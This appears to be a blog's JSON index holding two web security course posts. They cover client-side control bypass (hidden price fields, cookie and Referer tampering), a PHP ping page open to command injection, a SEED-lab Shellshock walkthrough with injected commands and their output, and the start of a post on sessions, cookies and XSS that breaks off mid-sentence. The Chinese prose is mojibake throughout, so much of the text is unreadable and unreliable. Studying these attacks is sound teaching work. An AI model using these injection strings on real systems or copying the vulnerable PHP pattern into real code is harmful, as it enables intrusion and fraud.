æˆ‘ä»¬ç›´æ¥æ¥çœ‹å…·ä½“çš„ç§ç±»å’Œä¾‹å­å§   URL parameters URLå‚æ•° URLåé¢æ¥çš„GETå‚æ•°å¯ä»¥è¢«è½»æ˜“ä¿®æ”¹ http://example.com/shop/?prod=3\u0026amp;price=32\u0026amp;currency=USD   Hidden form fields éšè—çš„è¡¨æ ¼å†…å®¹ æœ‰äº›ç½‘é¡µä¼šæœ‰éšè—çš„è¡¨å•å†…å®¹ç”¨äºåç»­çš„æäº¤ï¼Œè¿™äº›è¡¨æ ¼å¯ä»¥è½»æ˜“è¢«æµè§ˆå™¨çš„å¼€å‘å·¥å…·æ‰€ä¿®æ”¹ï¼Œå› æ­¤æœåŠ¡å™¨ç«¯ä¹Ÿå¾—å¯¹è¿™éƒ¨åˆ†çš„æ•°æ®åšä¸¥æ ¼çš„å®¡æ ¸ \u0026lt;p\u0026gt;Please enter the required quantity:\u0026lt;/p\u0026gt; \u0026lt;form method=\u0026#34;post\u0026#34; action=\u0026#34;Shop.aspx?prod=1\u0026#34;\u0026gt; Product: xPhone Ultimate \u0026lt;br/\u0026gt; Price: 449 \u0026lt;br/\u0026gt; (Maximum quantity is 50)\u0026lt;br/\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;price\u0026#34; value=\u0026#34;449\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Buy\u0026#34;\u0026gt; \u0026lt;/form\u0026gt;   Length limits é•¿åº¦é™åˆ¶ é•¿åº¦çš„é™åˆ¶ä¹Ÿå¯ä»¥è½»æ˜“è¢«ä¿®æ”¹ \u0026lt;p\u0026gt;Please enter the required quantity:\u0026lt;/p\u0026gt; \u0026lt;form method=\u0026#34;post\u0026#34; action=\u0026#34;Shop.aspx?prod=1\u0026#34;\u0026gt; Product: iPhone Ultimate \u0026lt;br/\u0026gt; Price: 449 \u0026lt;br/\u0026gt; Quantity: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;quantity\u0026#34; maxlength=\u0026#34;1\u0026#34;\u0026gt; (Maximum quantity is 50) \u0026lt;br/\u0026gt; \u0026lt;input type=â€hiddenâ€ name=â€priceâ€ value=â€449â€\u0026gt; \u0026lt;input type=â€submitâ€ value=â€Buyâ€\u0026gt; \u0026lt;/form\u0026gt;   Disabled elements ä¸å¯ä¿®æ”¹çš„å…ƒç´  å¼€å‘è€…å·¥å…·ä¿®æ”¹ \u0026lt;p\u0026gt;Please enter the required quantity:\u0026lt;/p\u0026gt; \u0026lt;form method=\u0026#34;post\u0026#34; action=\u0026#34;Shop.aspx?prod=1\u0026#34;\u0026gt; Product: iPhone Ultimate \u0026lt;br/\u0026gt; Price: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;price\u0026#34; disabled=\u0026#34;true\u0026#34; value=\u0026#34;449\u0026#34;\u0026gt; Quantity: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;quantity\u0026#34;\u0026gt;(Maximum quantity is 50) \u0026lt;br/\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Buy\u0026#34;\u0026gt; \u0026lt;/form\u0026gt;   Script-based validation å‰ç«¯çš„JSè„šæœ¬æ£€æŸ¥ï¼Œå¯ä»¥é€šè¿‡debuggerï¼ŒBurpæŠ“ä½è¯·æ±‚åç›´æ¥ä¿®æ”¹ï¼Œchromeå¯ä»¥ç›´æ¥ä¿®æ”¹ \u0026lt;form method=\u0026#34;post\u0026#34; action=\u0026#34;Shop.aspx?prod=2\u0026#34; onsubmit=\u0026#34;return validateForm(this)\u0026#34;\u0026gt; Product: Samsung Multiverse \u0026lt;br/\u0026gt; Price: 399 \u0026lt;br/\u0026gt; Quantity: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;quantity\u0026#34; (Maximum quantity is 50) \u0026lt;br/\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Buy\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; function validateForm(theForm) { var isInteger = /^\\d+$/; var valid = isInteger.test(quantity) \u0026amp;\u0026amp; quantity \u0026gt; 0 \u0026amp;\u0026amp; quantity \u0026lt;= 50; if (!valid) alert(\u0026#39;Please enter a valid quantity\u0026#39;); return valid; } \u0026lt;/script\u0026gt;   Referer header Burpæ‹¦æˆªè¯·æ±‚åå¯ä»¥ç›´æ¥ä¿®æ”¹ GET /auth/472/CreateUser.ashx HTTP/1.1 Host: mdsec.net Referer: https://mdsec.net/auth/472/Admin.ashx   HTTP cookies Burpæ‹¦æˆªè¯·æ±‚åå¯ä»¥ç›´æ¥ä¿®æ”¹ POST /shop/92/Shop.aspx?prod=3 HTTP/1.1 Host: mdsec.net Cookie: DiscountAgreed=25 Content-Length: 10 quantity=1   Local/Remote File Inclusion (LFI/RFI) æ–‡ä»¶åŒ…å« è¯¦è§ï¼šhttps://ginkgo.org.cn/posts/lrfi_basic/ Command Injection å‘½ä»¤è¡Œæ³¨å…¥ å‘½ä»¤è¡Œæ³¨å…¥æ¼æ´ä¸»è¦ç”±é»‘å®¢åˆ©ç”¨PHPä¸­æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°æ¥æ‰§è¡Œè‡ªå·±çš„æ¶æ„ä»£ç (e.g., system(), exec(), popen()). å‚æ•°é€šå¸¸ç”±POST or GETå‚æ•°ä¼ å…¥ ä¾‹å¦‚æˆ‘ä»¬æœ‰ä¸€ä¸ªping.phpéœ€è¦ä¼ å…¥ä¸€ä¸ªGETå‚æ•°æ¥æµ‹è¯•ä¸€ä¸ªhostçš„pingè¿æ¥ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬ç”¨ â€˜;â€™ æ‹¼æ¥è¿™ä¸ªpingæŒ‡ä»¤ï¼Œå°±å¯ä»¥æ‰§è¡Œé¢å¤–çš„æ“ä½œ \u0026lt;?php $host = $_GET[\u0026#39;host\u0026#39;]; system(\u0026#39;ping -c 4 \u0026#39;.$host); ?\u0026gt; Shellshock æ¥ä¸‹æ¥æˆ‘ä»¬æ¥ä»‹ç»ä¸€ä¸ªå¾ˆå…¸å‹çš„å‘½ä»¤è¡Œæ³¨å…¥çš„æ¼æ´ï¼Œå«åšShellshockï¼Œ Knowledge Prerequisites æˆ‘ä»¬å¹³æ—¶ç»å¸¸ä½¿ç”¨ç»ˆç«¯æ¥è¿›è¡Œä¸€äº›æ–‡ä»¶æ“ä½œï¼Œä»¥åŠå®‰è£…å‘½ä»¤è¡Œå·¥å…·æ¥å¢å¼ºå…¶åŠŸèƒ½ã€‚ é‚£ä¹ˆç›¸ä¿¡å¤§å®¶ä¹Ÿå°†ä¼šç»å¸¸è¢«é…ç½®ç¯å¢ƒå‚æ•°æçš„å¤´ç–¼ä¸å·²ï¼Œè€Œåœ¨shellshockä¸­æˆ‘ä»¬æ­£æ˜¯åˆ©ç”¨ç¯å¢ƒå˜é‡æ¥æ³¨å…¥å‘½ä»¤è¡Œã€‚ é¦–å…ˆå¤§å®¶ä¸€èˆ¬åœ¨Linuxä¸Šä½¿ç”¨çš„ç»ˆç«¯éƒ½æ˜¯bashï¼Œshellshockä¹Ÿå‘ç”Ÿåœ¨è€ç‰ˆæœ¬çš„bashä¸Šé¢ æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†é€šè¿‡æ¯”è¾ƒBashåœ¨ä¸€èˆ¬æ¨¡å¼ä¸‹çš„å˜é‡å®šä¹‰çš„è¡¨ç°ï¼Œä»¥åŠå¯¹æ¯”å¼€å¯ä¸€ä¸ªæ–°çš„bashå­è¿›ç¨‹ä¹‹åï¼Œè¿™äº›å˜é‡ä¼šæœ‰ä»€ä¹ˆè¡¨ç°æ¥è¿›ä¸€æ­¥äº†è§£è¿™äº›ä»¤äººå¤´ç–¼çš„å˜é‡   æ™®é€šshellå˜é‡å’Œbashå­è¿›ç¨‹ä¸­çš„å˜é‡ [04/12/2018 09:26] seed@ubuntu:~/Seed/shellshock$ gu=\u0026#34;hacker\u0026#34; [04/12/2018 09:26] seed@ubuntu:~/Seed/shellshock$ echo $gu hacker [04/12/2018 09:26] seed@ubuntu:~/Seed/shellshock$ bash #è¿›å…¥å­è¿›ç¨‹ [04/12/2018 09:27] seed@ubuntu:~/Seed/shellshock$ echo $gu #æ— äº‹å‘ç”Ÿ [04/12/2018 09:27] seed@ubuntu:~/Seed/shellshock$ exit exit [04/12/2018 09:27] seed@ubuntu:~/Seed/shellshock$   ç»“è®ºï¼šbashå­è¿›ç¨‹æ²¡æœ‰ç»§æ‰¿æ™®é€šshellçš„å˜é‡ $gu   æ™®é€šç¯å¢ƒå˜é‡ä¸bashå­è¿›ç¨‹ä¸­çš„ç¯å¢ƒå˜é‡ [04/12/2018 09:31] seed@ubuntu:~/Seed/shellshock$ echo $gu hacker [04/12/2018 09:32] seed@ubuntu:~/Seed/shellshock$ export gu [04/12/2018 09:32] seed@ubuntu:~/Seed/shellshock$ bash [04/12/2018 09:32] seed@ubuntu:~/Seed/shellshock$ echo $gu #ç»§æ‰¿äº†ç¯å¢ƒå˜é‡ hacker [04/12/2018 09:32] seed@ubuntu:~/Seed/shellshock$ exit exit [04/12/2018 09:32] seed@ubuntu:~/Seed/shellshock$   ç»“è®ºï¼šbashå­è¿›ç¨‹ç»§æ‰¿äº†æ™®é€šshellä¸­å®šä¹‰çš„ç¯å¢ƒå˜é‡ $gu   æ™®é€šå‡½æ•°å˜é‡å’Œbashå­è¿›ç¨‹ä¸­çš„å‡½æ•°å˜é‡ [04/12/2018 09:37] seed@ubuntu:~/Seed/shellshock$ gu() { echo \u0026#34;gu is a hacker\u0026#34;;} [04/12/2018 09:37] seed@ubuntu:~/Seed/shellshock$ gu gu is a hacker [04/12/2018 09:38] seed@ubuntu:~/Seed/shellshock$ bash [04/12/2018 09:38] seed@ubuntu:~/Seed/shellshock$ gu # guæœªè¢«å®šä¹‰ gu: command not found [04/12/2018 09:38] seed@ubuntu:~/Seed/shellshock$ exit exit [04/12/2018 09:38] seed@ubuntu:~/Seed/shellshock$   ç»“è®ºï¼šbashå­è¿›ç¨‹æ²¡æœ‰ç»§æ‰¿å‡½æ•°å˜é‡ gu   å‡½æ•°ç¯å¢ƒå˜é‡å’Œbashå­è¿›ç¨‹ä¸­çš„å‡½æ•°ç¯å¢ƒå˜é‡ [04/12/2018 09:41] seed@ubuntu:~/Seed/shellshock$ gu gu is a hacker [04/12/2018 09:41] seed@ubuntu:~/Seed/shellshock$ export -f gu [04/12/2018 09:41] seed@ubuntu:~/Seed/shellshock$ bash [04/12/2018 09:42] seed@ubuntu:~/Seed/shellshock$ gu # inherit the environment variables gu gu is a hacker [04/12/2018 09:42] seed@ubuntu:~/Seed/shellshock$ exit exit [04/12/2018 09:42] seed@ubuntu:~/Seed/shellshock$ env | grep gu gu=hacker gu=() { echo \u0026#34;gu is a hacker\u0026#34; [04/12/2018 09:42] seed@ubuntu:~/Seed/shellshock$   ç»“è®ºï¼šbashå­è¿›ç¨‹ç»§æ‰¿äº†å‡½æ•°ç¯å¢ƒå˜é‡ gu shellshockå‘ç”Ÿçš„åŸå›  æ¥ä¸‹æ¥æˆ‘ä»¬æ¥å°è¯•ä¸€ç‚¹ä¸ä¸€æ ·çš„   æ™®é€šå‡½æ•°å˜é‡å†å°è¯• [04/12/2018 09:42] seed@ubuntu:~/Seed/shellshock$ ailx10=\u0026#39;() { echo \u0026#34;ailx10 is a hacker\u0026#34;;}\u0026#39; # æ™®é€šå‡½æ•°å˜é‡ [04/12/2018 09:48] seed@ubuntu:~/Seed/shellshock$ export -nf gu # åˆ é™¤ç¯å¢ƒå‡½æ•°å˜é‡gu [04/12/2018 09:48] seed@ubuntu:~/Seed/shellshock$ export -n gu # åˆ é™¤ç¯å¢ƒå˜é‡gu [04/12/2018 09:49] seed@ubuntu:~/Seed/shellshock$ export -f ailx10 # ä¿å­˜ç¯å¢ƒå‡½æ•°å˜é‡ï¼Œå¤±è´¥ bash: export: ailx10: not a function [04/12/2018 09:49] seed@ubuntu:~/Seed/shellshock$ export ailx10 # ä¿å­˜ç¯å¢ƒå˜é‡ï¼ŒæˆåŠŸ [04/12/2018 09:49] seed@ubuntu:~/Seed/shellshock$ bash # è¿›å…¥Bashå­è¿›ç¨‹ [04/12/2018 09:50] seed@ubuntu:~/Seed/shellshock$ ailx10 #ailx10 å‡½æ•°è¢«ç»§æ‰¿ ailx10 is a hacker [04/12/2018 09:50] seed@ubuntu:~/Seed/shellshock$ env | grep ailx10 # Pattern \u0026#34;(){ :; }\u0026#34; è¢«å½“ä½œç¯å¢ƒå˜é‡ä¿å­˜äº†ï¼ˆå› æ­¤èƒ½å¤Ÿè¢«è¿›ç¨‹ï¼‰ ailx10=() { echo \u0026#34;ailx10 is a hacker\u0026#34; [04/12/2018 09:50] seed@ubuntu:~/Seed/shellshock$ exit exit [04/12/2018 09:50] seed@ubuntu:~/Seed/shellshock$ env | grep ailx10 ailx10=() { echo \u0026#34;ailx10 is a hacker\u0026#34;;} [04/12/2018 09:50] seed@ubuntu:~/Seed/shellshock$   ç»“è®ºï¼šå› ä¸ºæˆ‘ä»¬å†å®šä¹‰å‡½æ•° ailx10 çš„æ—¶å€™ï¼Œç”¨äº† (){ :; } ï¼Œæ‰€ä»¥æ— æ³•è¢«è¯†åˆ«ä¸ºç¯å¢ƒå‡½æ•°å˜é‡ï¼Œè¢«å½“ä½œæ˜¯ç¯å¢ƒå˜é‡ä¿å­˜äº†   () { :; }å†å°è¯• [04/12/2018 09:57] seed@ubuntu:~/Seed/shellshock$ ailx10=\u0026#39;() { :; };/bin/ls\u0026#39; [04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ export ailx10 # å½“ä½œç¯å¢ƒå˜é‡ä¿å­˜ [04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ bash # /bin/ls ä½œä¸ºç¯å¢ƒå˜é‡å´è¢«æ‰§è¡Œäº† curl-7.20.0 myls myls.c myprog.cgi.1 readme.txt curl-7.20.0.tar.gz myls-notroot myprog.cgi myprog.cgi.2 [04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ exit exit [04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$   è‡³æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥æ€»ç»“ Shellshock æ¼æ´äº§ç”Ÿçš„åŸå›   å®šä¹‰ç¯å¢ƒå‡½æ•°å˜é‡çš„æ—¶å€™ï¼ŒBashé”™è¯¯çš„è¯†åˆ«äº† () { :; } è¿™ç§æ ¼å¼ï¼Œè¢«å½“ä½œçš„æ˜¯ç¯å¢ƒå˜é‡ä¿å­˜äº†  è°ƒç”¨æ–°çš„bashå­è¿›ç¨‹  ç¯å¢ƒå˜é‡è¢«ç»§æ‰¿ï¼Œå¹¶æ‰§è¡Œï¼Œå¯¼è‡´æ¶æ„ä»£ç è¢«æ‰§è¡Œ     éªŒè¯Shellshockçš„æ–¹æ³•\n env x=\u0026#39;() { :;}; echo vulnerable\u0026#39; bash -c \u0026#34;echo this is a test\u0026#34;   ç¬¬ä¸€éƒ¨åˆ†ä¼šè¢«Bashè§£æä¸ºä¸€ä¸ªç¯å¢ƒå˜é‡è¿›è¡Œä¿å­˜   ç¬¬äºŒéƒ¨åˆ†ä¸ºéœ€è¦æ‰§è¡Œçš„æ¶æ„æŒ‡ä»¤   ç¬¬ä¸‰éƒ¨åˆ†ä¸ºè°ƒç”¨ä¸€ä¸ªbashå­è¿›ç¨‹ï¼ŒåŒæ—¶ä¼šç»§æ‰¿ç¯å¢ƒå˜é‡å¹¶æ‰§è¡Œæ¶æ„æŒ‡ä»¤ï¼Œ -c ç”¨æ¥åœ¨æ–°çš„bashä¸‹æ‰§è¡Œä»£ç ä»¥è¡¨æ˜æ–°bashå­è¿›ç¨‹å¯åŠ¨æˆåŠŸ [04/12/2018 10:14] seed@ubuntu:~/Seed/shellshock$ env x=\u0026#39;() { :;}; echo vulnerable\u0026#39; bash -c \u0026#34;echo this is a test\u0026#34; vulnerable this is a test [04/12/2018 10:14] seed@ubuntu:~/Seed/shellshock$ [04/12/2018 10:14] seed@ubuntu:~/Seed/shellshock$ [04/12/2018 10:14] seed@ubuntu:~/Seed/shellshock$ env x=\u0026#39;() { :;}; echo vulnerable\u0026#39; bash -c : vulnerable [04/12/2018 10:14] seed@ubuntu:~/Seed/shellshock$   éœ€è¦æ³¨æ„çš„æ˜¯ ':' ä»€ä¹ˆä¹Ÿä¸åšæ˜¯ä¸€ä¸ªç©ºå‘½ä»¤ï¼Œç›¸å½“äº :: $ if true; then echo yes; fi yes $ if :; then echo yes; fi yes $   shellshock çš„å±å®³ å¯ä»¥è¢«ç”¨æ¥åå¼¹shellï¼Ÿ  Webåº”ç”¨ä¸­çš„æ¡ä»¶ç«äº‰æ¼æ´ æ¡ä»¶ç«äº‰ä¸»è¦å°±æ˜¯åœ¨äºå¤šçº¿ç¨‹çš„è®¿é—®å¹¶ä¿®æ”¹æœåŠ¡ç«¯çš„èµ„æºï¼Œå› ä¸ºæ²¡æœ‰æ§åˆ¶å¥½å¤šä¸ªçº¿ç¨‹ä¹‹é—´çš„æ‰§è¡Œæ¬¡åºï¼Œæ²¡æœ‰å¾ˆå¥½çš„ä¸Šé”ï¼Œå¯¼è‡´ä»–ä»¬è®¿é—®çš„æ•°æ®ä¸åŒæ­¥ï¼Œä»è€Œå¯¼è‡´æœ€åçš„æ•°æ®å‡ºç°é”™è¯¯ã€‚ è¿™ä¸ªæˆ‘ä»¬åœ¨åšCTFçš„æ—¶å€™åº”è¯¥ä¹Ÿæœ‰é‡åˆ°è¿‡ï¼Œæ¯”å¦‚é€šè¿‡æ¡ä»¶ç«äº‰ç»•è¿‡çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ Appendix env https://linux.die.net/man/1/env Name env - run a program in a modified environment Synopsis env [OPTION]\u0026hellip; [-] [NAME=VALUE]\u0026hellip; [COMMAND [ARG]\u0026hellip;] Description Set each NAME to VALUE in the environment and run COMMAND. -i, \u0026ndash;ignore-environment start with an empty environment -0, \u0026ndash;null end each output line with 0 byte rather than newline -u, \u0026ndash;unset=NAME remove variable from the environment \u0026ndash;help display this help and exit \u0026ndash;version output version information and exit A mere - implies -i. If no COMMAND, print the resulting environment. export NAME export - Set export attribute for shell variables. SYNOPSIS export [-fn] [name[=value] \u0026hellip;] or export -p DESCRIPTION Set export attribute for shell variables. Marks each NAME for automatic export to the environment of subsequently executed commands. If VALUE is supplied, assign VALUE before exporting. Options: -f\trefer to shell functions -n\tremove the export property from each NAME -p\tdisplay a list of all exported variables and functions An argument of `\u0026ndash;\u0026rsquo; disables further option processing. Exit Status: Returns success unless an invalid option is given or NAME is invalid. SEE ALSO bash(1) IMPLEMENTATION GNU bash, version 5.0.17(1)-release (x86_64-redhat-linux-gnu) Copyright (C) 2019 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later http://gnu.org/licenses/gpl.html Reference OWASP:Shellshock ä»€ä¹ˆæ˜¯ShellShockæ”»å‡»ï¼Ÿ ","date":"2022-05-20T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/sct_topic_4_web_attacks_bypassing_client-side_authentication_and_others/","title":"SCT Topic 4: Web Attacks - Bypassing client-side authentication and others"},{"content":"Client-side Attacks é’ˆå¯¹å®¢æˆ·ç«¯çš„Webæ”»å‡» Prerequisite è¦äº†è§£é’ˆå¯¹Webå®¢æˆ·ç«¯çš„æ”»å‡»ï¼Œæˆ‘ä»¬å¿…é¡»è¦å…ˆäº†è§£Sessionä¸Cookieçš„æœºåˆ¶ HTTPåè®®åœ¨æœ€åˆè®¾è®¡çš„æ—¶å€™æ˜¯ä¸€ä¸ªæ— çŠ¶æ€ï¼ˆstatelessï¼‰çš„åè®®ï¼Œç”¨æˆ·åœ¨æµè§ˆç½‘é¡µçš„æ—¶å€™å‘å‡ºè¯·æ±‚ï¼Œå®¢æˆ·ç«¯åªæ˜¯è¿”å›é¡µé¢çš„å†…å®¹ï¼Œä¸ä¼šä¿ç•™ä»»ä½•å…³äºæœ¬æ¬¡è¯·æ±‚çš„ä¿¡æ¯ï¼Œå³å¯¹ç”¨æˆ·ä¸€æ— æ‰€çŸ¥ã€‚ å¯æ˜¯éšç€Webåº”ç”¨çš„å‘å±•ï¼Œä¸€äº›æœåŠ¡è¦æ±‚ä¿å­˜ç”¨æˆ·çš„çŠ¶æ€ï¼Œä¾‹å¦‚ç½‘è´­ç­‰å°±éœ€è¦ç”¨æˆ·è¿›è¡Œç™»å½•åè®¿é—®è‡ªå·±çš„ä¸“å±å†…å®¹ï¼Œé‚£ä¹ˆå®ç°çŠ¶æ€ï¼ˆstateï¼‰ä¿å­˜çš„æ–¹å¼å°±æ˜¯ Session ä¼šè¯ï¼Œä¼šè¯çš„åŒæ–¹å°±æ˜¯æœåŠ¡å™¨ç«¯ä»¥åŠæµè§ˆå™¨çš„ç”¨æˆ·ç«¯ã€‚æ¯æ¬¡ç”¨æˆ·å‘èµ·è¯·æ±‚ï¼Œå‘æœåŠ¡ç«¯è¯·æ±‚å…³äºå…¶ä¸“å±è´¦å·çš„å†…å®¹çš„æ—¶å€™ï¼Œéƒ½éœ€è¦é™„å¸¦ä¸Šè‡ªå·±ä¸“å±çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ credentialä¸ªäººæ ‡è¯†ç¬¦, æ·»åŠ åœ¨è´­ç‰©è½¦çš„å†…å®¹ã€‚ ä¿å­˜è¿™äº›å†…å®¹çš„æ–¹å¼æœ‰ï¼š   ä¿å­˜åœ¨æœ¬åœ°htmlä¸­çš„éšè—å†…å®¹ (è¿‡æ—¶) \u0026lt;INPUT TYPE=\u0026#34;hidden\u0026#34; NAME=\u0026#34;sessionid\u0026#34; VALUE=\u0026#34;7456\u0026#34;\u0026gt;   Cookie (åé¢å±•å¼€)   è€Œå‘æœåŠ¡å™¨ç«¯ä¼ é€’è¿™äº›ä¿¡æ¯çš„æ‰‹æ³•   URL http://www.example.com/page.php?sessionid=7456   HTTP header (e.g., cookie) GET /page.php HTTP/1.1 Host: www.example.com ... Cookie: sessionid=7456 ...   æ…¢æ…¢çš„Cooikeå¼€å§‹è¢«å¹¿æ³›çš„ä½¿ç”¨ï¼Œä½†æ˜¯cookieæœ‰å¤§å°çš„é™åˆ¶ï¼ˆmaximum size: 4096bytesï¼‰,æ— æ³•å­˜å‚¨å¤ªå¤šçš„å†…å®¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸ºä»€ä¹ˆä¸åœ¨æœåŠ¡ç«¯æ¥å­˜å‚¨è¿™äº›ä¿¡æ¯å‘¢ï¼Œè¿™æ ·ä¹Ÿæ›´å®‰å…¨ï¼Œä¿¡æ¯ä¹Ÿå¯ä»¥æ›´æ–¹ä¾¿çš„è¢«åˆ©ç”¨ã€‚ é‚£ä¹ˆåˆå¤šäº†ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æœåŠ¡ç«¯å­˜å‚¨äº†è¿™äº›å†…å®¹ï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯å‘Šè¯‰æœåŠ¡ç«¯è‡ªå·±éœ€è¦çš„æ˜¯å“ªä¸€ä¸ªsessionçš„å†…å®¹å‘¢ï¼Ÿè¿™äº›å°±éœ€è¦æœåŠ¡ç«¯åœ¨å¼€å¯ä¸€ä¸ªsessionï¼ˆä¾‹å¦‚ç”¨æˆ·ç™»å½•çš„æ—¶å€™ï¼‰çš„æ—¶å€™ï¼Œè¿”å›ç»™å®¢æˆ·ç«¯ä¸€ä¸ª sessionId ï¼Œä¹‹åæ¯æ¬¡å®¢æˆ·ç«¯å‘å‡ºHTTPè¯·æ±‚çš„æ—¶å€™ï¼Œéƒ½å¸¦ä¸Šè¿™ä¸ª sessionId ï¼ŒæœåŠ¡ç«¯å°±çŸ¥é“äº†æ˜¯è°è¦è®¿é—®ä»€ä¹ˆä¿¡æ¯äº†ï¼Œç„¶åå½“ç”¨æˆ·ç™»å‡ºçš„æ—¶å€™ï¼Œå°±è‡ªåŠ¨åˆ é™¤sessionçš„å†…å®¹èŠ‚çœå†…å­˜ï¼ˆå†å²ä¿¡æ¯å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼‰ã€‚ é€šè¿‡ä»¥ä¸Šæˆ‘ä»¬å¯ä»¥ç¨å¾®æ€»ç»“ä¸€ä¸‹Sessionä¸Cookieçš„ç‰¹ç‚¹ï¼š  Sessionæ˜¯å­˜å‚¨åœ¨æœåŠ¡ç«¯çš„ï¼Œç”±sessionIdæ¥å”¯ä¸€æ ‡è¯†  Cookieæ˜¯ç”±æœåŠ¡ç«¯äº§ç”Ÿåä¿å­˜åœ¨å®¢æˆ·ç«¯çš„ç®€çŸ­ä¿¡æ¯ï¼Œç”¨åœ¨HTTPè¯·æ±‚ä¸­å‘æœåŠ¡ç«¯å±•ç¤ºæ‰€æ‹¥æœ‰çš„ä¿¡æ¯   Cookie æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å†æ¥å±•å¼€è®²è®²Cookieçš„å†…å®¹ æˆ‘ä»¬å†æ¥å›é¡¾ä¸€ä¸‹ï¼ŒCookieä¸Sessionæœ€å¤§çš„åŒºåˆ«å°±æ˜¯ï¼ŒCookieæ˜¯ç”± æœåŠ¡å™¨ç«¯åˆ›é€  çš„ï¼Œå­˜å‚¨åœ¨ å®¢æˆ·ç«¯ çš„ä¿¡æ¯ï¼Œå¦‚æœæˆ‘ä»¬ç”¨BurpSuiteæŠ“HTTPè¯·æ±‚ï¼Œæˆ‘ä»¬å°±ä¼šå‘ç°å¾ˆå¤šè¯·æ±‚éƒ½ä¼šå¸¦ä¸ŠCookieçš„å†…å®¹ï¼Œè¿™å°±æ˜¯å®¢æˆ·ç«¯é€šè¿‡å‘æœåŠ¡ç«¯å±•ç¤ºè‡ªå·±æ‰€æ‹¥æœ‰çš„ï¼ˆæ¥è‡ªæœåŠ¡ç«¯åˆ†é…çš„ï¼‰ç‰¹å®šcookieï¼Œæ¥å‡å°‘è®¤è¯çš„å¤æ‚åº¦  Cookieé€šè¿‡HTTP headerå‘æœåŠ¡ç«¯è¿›è¡Œä¼ é€’ï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯ä¸€å¯¹é”®å€¼å¯¹ï¼Œä½†ä¹Ÿå¯ä»¥è®¾ç½®ä¸€äº›é¢å¤–çš„ä¿¡æ¯æ¥å¢åŠ ä½¿ç”¨çš„çµæ´»æ€§  æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æµè§ˆå™¨æ¥è§‚å¯Ÿè¿™äº›å­˜å‚¨åˆ°æµè§ˆå™¨æœ¬åœ°çš„cookie  æœåŠ¡ç«¯åˆ™é€šè¿‡HTTPçš„å›å¤æ¥è®¾ç½®cookieçš„å†…å®¹ä»¥åŠå…¶ä»–å‚æ•°  Client-side Attacks Goals é’ˆå¯¹å®¢æˆ·ç«¯çš„æ”»å‡»çš„ç›®æ ‡  ç›—å–Cookie  ç¯¡æ”¹ç™»å½•è¡¨æ ¼  æ‰§è¡Œé¢å¤–çš„HTTPè¯·æ±‚  ä»¥åŠä»»ä½•ç”¨HTMLä»¥åŠJavascriptåšçš„ä»»ä½•äº‹æƒ…ï¼   XSS Cross-Site Scripting è·¨ç«™è„šæœ¬æ”»å‡»(ç®€å†™ä¸ºXSSä¸»è¦æ˜¯ä¸ºäº†ä¸CSSåŒºåˆ†å¼€) çš„ä¸»è¦ç›®æ ‡å°±æ˜¯ä¸ºäº†èƒ½å¤Ÿåœ¨ç›®æ ‡é¡µé¢ä¸Šæ‰§è¡Œéæ³•çš„è„šæœ¬ï¼ˆJSï¼‰ä»£ç ï¼Œâ€œè·¨ç«™â€äºŒå­—å°±ä½“ç°åœ¨æ‰§è¡Œäº†æœ¬ä¸åº”è¯¥å‡ºç°åœ¨è¿™ä¸ªç½‘ç«™ä¸Šçš„è„šæœ¬ä»£ç ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œé€ æˆçš„åŸå› è¿˜æ˜¯ç¼ºä¹å¯¹äºç”¨æˆ·è¾“å…¥çš„æ£€æŸ¥ï¼Œè¿›è€Œå¯¼è‡´éæ³•çš„HTML/JSä»£ç æ³¨å…¥åˆ°é¡µé¢ä¸Šï¼Œè¢«æµè§ˆå™¨è§£æä¹‹åï¼Œæ”»å‡»è€…å°±æ˜¯å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç  å…¶å…·ä½“è¡¨ç°å¾€å¾€å°±æ˜¯é€šè¿‡ç²¾å¿ƒè®¾è®¡çš„ä¸€ä¸ªURLï¼Œé€šè¿‡ç¤¾ä¼šå·¥ç¨‹å­¦çš„æ–¹æ³•è¯±å¯¼ç”¨æˆ·è¿›è¡Œç‚¹å‡»ï¼ŒURLä¸­åŒ…å«äº†å°†ä¼šæ¤å…¥åˆ°é¡µé¢å½“ä¸­ï¼Œè¢«æµè§ˆå™¨æ‰€è§£ææ‰§è¡Œçš„æ¶æ„ä»£ç ã€‚ æ¥ç€æˆ‘ä»¬æ¥çœ‹ä¸€çœ‹å¸¸è§çš„ä¸‰ç§XSSæ”»å‡» Reflected XSS åå°„å‹XSS \u0026ldquo;åå°„\u0026quot;æ„å‘³ç€ä¸€ä¸ªç”¨æˆ·å°†ä¸åˆæ³•çš„è¾“å…¥å…ˆä¼ ç»™æœåŠ¡å™¨ï¼Œç„¶åæœåŠ¡å™¨å†å°†ä¸åˆæ³•çš„javascriptä»£ç 